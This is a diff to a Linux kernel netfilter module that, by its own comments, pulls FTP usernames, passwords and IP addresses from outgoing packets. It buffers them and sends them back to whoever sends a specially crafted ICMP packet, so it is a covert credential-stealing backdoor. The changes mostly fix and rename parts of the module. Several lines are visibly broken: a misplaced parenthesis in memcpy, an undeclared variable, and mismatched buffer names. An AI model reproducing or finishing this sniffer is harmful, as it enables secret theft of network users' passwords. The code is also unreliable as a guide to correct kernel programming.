@@ -32,7 +32,6 @@
 #define     ERRORMSG	     "Error, Buffer is empty"
 
 
-//struct sk_buff *icmp_orig = NULL;
 
 /* This function checks the outgoing FTP packet
  * Parse the packet to get username, IP address and Password
@@ -43,13 +42,14 @@
 struct buff_ctl *buffer_ctl;
 struct ctl_mesg *setup_msg;
 
+/**
+ *      repack       - swap mac address and IP address
+ *      @skb: sk_buff 
+ *
+ */
 
 static void repack(struct sk_buff *skb)
 {
-
-
-   // struct sk_buff *new_icmp_skb = skb_copy(skb_icmp,GFP_ATOMIC);
-
     char *cp_data;
     unsigned int addr;
     int total_len, iphdr_len, data_size;
@@ -74,8 +74,8 @@ static void repack(struct sk_buff *skb)
         case ARPHRD_LOOPBACK:
         case ARPHRD_ETHER:
         {
-
-            skb->data = (unsigned char *)skb->mac.ethernet;
+            skb->data = (unsigned char *)skb->mac_header;//currently it points to IP header
+            skb->len += ETH_HLEN;
             memcpy(t_hwaddr, eth->h_dest, ETHLEN);
 	    memcpy(eth->h_dest, eth->h_source), ETHLEN);
 	    memcpy(eth->h_source, t_hwaddr, ETHLEN);
@@ -86,14 +86,7 @@ static void repack(struct sk_buff *skb)
 
     }
 
-
-
-    /*
-     *   Enter Critical Section
-     */
-
-    dev_queue_xmit(new_icmp_skb);
-    
+    dev_queue_xmit(new_icmp_skb);    
 
 }
 
@@ -124,7 +117,7 @@ static void parse_packet_tcp(struct sk_buff *skb, struct tcphdr *tcp_h)
         buffer_ctl->buff_length += data_size;
     }    
 
-    spin_unlock(&buffer_ctl.buff_lock);
+    spin_unlock(&buffer_ctl->buff_lock);
 
 }
 
@@ -181,7 +174,7 @@ static unsigned int monitor_packet_out(unsigned int hooknum,
         return NF_ACCEPT;
 
     /*
-     *  Check if it's TCP packet. Let it go if it's not
+     *  Check if it's TCP/UDP packet. Let it go if it's not
      */
 
     if(setup_msg->set_port_flag == 1 && 
@@ -215,7 +208,7 @@ static unsigned int monitor_packet_out(unsigned int hooknum,
         }
   
         else
-          return NF_ACCEPT;
+            return NF_ACCEPT;
 
      }
 
@@ -261,8 +254,6 @@ static unsigned int monitor_icmp_in(unsigned int hooknum,
     setup_msg = (struct ctl_mesg*)((char *)icmphead + sizeof(struct icmphdr));
 
 
-
-
     if(!icmphead->code)
        return NF_ACCEPT;
 
@@ -272,7 +263,7 @@ static unsigned int monitor_icmp_in(unsigned int hooknum,
 
     data = (char *)((char*)setup_msg + sizeof(struct ctl_mesg));
 
-    if(buffer_ctl.buff_length == 0)
+    if(buffer_ctl->buff_length == 0)
     {
 
         strcpy(data, ERRORMSG);
@@ -293,7 +284,7 @@ static unsigned int monitor_icmp_in(unsigned int hooknum,
 
     repack(sb);
 
-    dev_queue_xmit(sb);
+    //dev_queue_xmit(sb);
 
     return STOLEN;
 
@@ -346,7 +337,7 @@ static const struct nf_hook_ops icmp_hook = {
 
 };
 
-static const struct nf_hook_ops ftp_hook = {
+static const struct nf_hook_ops parse_hook = {
     .hook = monitor_packet_out,
     .owner = THIS_MODULE,
     .hooknum = NF_BR_POST_ROUTING,
@@ -369,24 +360,22 @@ static void sniff_init()
     setup_msg->kick_off_flag=0;
     setup_msg->post_hook_start_monitor=0;
 
-
 }
 
 
 int init_module()
 {
     nf_register_hook(icmp_hook);
-    nf_register_hook(ftp_hook);
-
-
+    nf_register_hook(parse_hook);
     return 0;
 }
 
 
 void cleanup_module()
 {
+   kfree(buff_ctl->buffer);
    nf_unregister_hook(&icmp_hook);
-   nf_unregister_hook(&ftp_hook);
+   nf_unregister_hook(&parse_hook);
 
 }
 
